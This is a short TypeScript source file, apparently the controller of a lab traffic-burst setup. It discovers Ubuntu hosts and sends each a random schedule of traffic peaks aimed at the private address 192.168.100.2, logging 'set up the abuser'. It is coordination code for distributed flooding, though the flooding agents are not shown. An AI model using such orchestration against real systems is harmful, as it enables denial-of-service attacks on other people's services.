console.log("Hello via Bun!");
import { $ } from "bun";
import DiscoverUbuntus from "./discovers/discoverUbuntus";







function generateRandomScheduler(targetIp: string) {
    const scheduler = {
        peaks: [] as any,
        duration: 60000, // 1 minute in milliseconds
        ticker: Math.floor(Math.random() * 50) + 1,
        targetIP: targetIp // Add your target IP logic here
    };

    // Random number of peaks
    const numPeaks = Math.floor(Math.random() * 20) + 1;

    // Start time for the first peak
    let previousEnd = 0;

    for (let i = 0; i < numPeaks; i++) {
        const peak = {
            height: Math.floor(Math.random() * 1000) + 1, // Random height
            width: Math.floor(Math.random() * 10000) + 1, // Random width
            start: previousEnd + Math.floor(Math.random() * 10000) + 1000 // Random start time after previous end time
        };

        previousEnd = peak.start + peak.width; // Update previous end time

        scheduler.peaks.push(peak);
    }

    return scheduler;
}



const aliveAddress = await DiscoverUbuntus()

aliveAddress.forEach(async (ip) => {

    await fetch(`http://${ip}:3000`, {
        method: "POST",
        body: JSON.stringify(generateRandomScheduler("192.168.100.2")),
        headers: {
            "content-type": "application/json"
        }
    })

    console.log("set up the abuser", ip)

})

